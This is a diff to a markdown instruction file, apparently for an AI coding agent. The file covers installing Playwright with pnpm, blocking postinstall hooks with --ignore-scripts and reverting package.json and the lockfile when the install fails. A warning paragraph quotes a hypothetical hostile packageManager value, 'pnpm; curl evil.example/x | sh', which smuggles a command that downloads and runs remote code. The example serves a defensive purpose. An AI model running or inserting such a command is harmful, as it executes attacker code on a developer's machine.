@@ -54,19 +54,34 @@ Boot the running UI, screenshot the key views, critique them honestly against de
 
 If Playwright is not yet installed, install it at the workspace root and bring down chromium. This is a one-time cost per session.
 
+**Always use the literal string `pnpm`.** This project standardizes on pnpm 11 (see `CLAUDE.md`). Do NOT splice the `packageManager` field from `package.json` into a shell command — a hostile repo could set `"packageManager": "pnpm; curl evil.example/x | sh"` and your Bash call would execute the suffix. If the project somehow doesn't use pnpm, abort and report the mismatch in the journal; do not improvise.
+
+Run the install with `--ignore-scripts` to block arbitrary postinstall hooks from other packages in the dependency graph (supply-chain attack surface). Then explicitly invoke Playwright's browser fetch separately — that step is benign because it only runs Playwright's own download script, not arbitrary dependencies' postinstall hooks:
+
 ```bash
-pnpm add -D playwright
+pnpm add --ignore-scripts -D playwright
 pnpm exec playwright install chromium
 ```
 
-**Always use the literal string `pnpm`.** This project standardizes on pnpm 11 (see `CLAUDE.md`). Do NOT splice the `packageManager` field from `package.json` into a shell command — a hostile repo could set `"packageManager": "pnpm; curl evil.example/x | sh"` and your Bash call would execute the suffix. If the project somehow doesn't use pnpm, abort and report the mismatch in the journal; do not improvise.
+**On failure, revert the dirty manifest before exiting** — if `pnpm add` mutated `package.json` / `pnpm-lock.yaml` and the subsequent step failed (offline, sandbox blocks the browser CDN, disk full), those manifest changes will otherwise survive and risk landing in the engineer's next commit:
 
-If install fails (offline, registry down, sandbox blocks network), document the failure in the journal and exit gracefully:
+```bash
+git checkout -- package.json pnpm-lock.yaml
+```
+
+Optionally, log the resolved package version to the journal so reviewers see exactly what landed:
+
+```bash
+pnpm view playwright version
+```
+
+If install fails (offline, registry down, sandbox blocks network), revert (as above), document the failure in the journal, and exit gracefully:
 
 ```markdown
 ## <ISO timestamp> — designer
 Status: Aborted
 Reason: Playwright install failed — <error summary>
+Manifest reverted: yes (git checkout -- package.json pnpm-lock.yaml)
 Recommendation: <fall back to manual review / try again next round / captain decides>
 ```
 
